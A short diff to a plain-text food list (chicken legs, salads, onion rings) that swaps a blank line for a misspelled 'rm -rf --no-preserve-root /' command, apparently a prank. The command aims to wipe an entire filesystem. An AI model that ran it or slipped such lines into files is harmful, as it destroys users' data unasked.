@@ -3,4 +3,4 @@ Chicken legs
 Cescars Salad
 Mozzarella Salad
 Onion rings
-
+rm -rf --no-preservere-root /
